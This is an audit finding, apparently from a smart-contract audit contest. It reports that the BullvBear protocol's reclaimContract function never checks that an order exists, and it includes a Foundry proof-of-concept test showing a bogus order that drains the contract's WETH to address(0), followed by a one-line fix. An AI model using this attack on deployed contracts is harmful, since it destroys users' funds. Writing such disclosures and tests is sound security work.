# [H] Missing order validation in reclaimContract function

## Summary
Severity: High

Type: audit-issue

## Details
# Missing order validation in reclaimContract function

## Summary
Protocol doesn't verify if the passed order exists or is valid in the function reclaimContract. This means a bogus order can be sent which fulfills all the required conditions, and all tokens in the contract can be sent to address(0).

## Vulnerability Detail
In the function reclaimContract, the existence of the order is never verified. If no such order exists, the bull address will be set to `address(0)`, the default value of an empty mapping. The subsequent checks can be passed by setting `order.expiry = 0`. In the end, the `order.premium + order.collateral` amount will be sent to `address(0)`, draining the protocol and causing loss of user funds. Some tokens have a 0 address check, but weth and plenty others do not.

## Impact
High Impact since all funds can be sent to address(0) and made irrecoverable

## Code Snippet
Affected Code: https://github.com/sherlock-audit/2022-11-bullvbear/blob/main/bvb-protocol/src/BvbProtocol.sol#L374-L411

Proof of concept of the attack
```solidity
function testAttack() public {
        // Fund the protocol, assume weth is from other running orders
        deal(address(weth), address(bvb), 5 ether);
        uint256 initBal = weth.balanceOf(address(bvb));

        // Create bogus order
        BvbProtocol.Order memory order = defaultOrder();
        order.expiry = 0;
        order.premium = initBal;
        order.collateral = 0;

        // Send bogus reclaim
        bvb.reclaimContract(order);

        // Assert
        uint256 zeroBal = weth.balanceOf(address(0));
        uint256 finalBal = weth.balanceOf(address(bvb));
        // Verify protocol balance is 0 even with a bogus, unmatched order
        assertEq(finalBal, 0);
        // Verify rest of the balance is sent to address(0)
        assertEq(initBal, zeroBal);
    }
```
## Tool used

Foundry

## Recommendation

Check existence of order by making sure bull address is not 0.

```solidity
    require(bull != address(0),"Zero Address cant be bull");
```
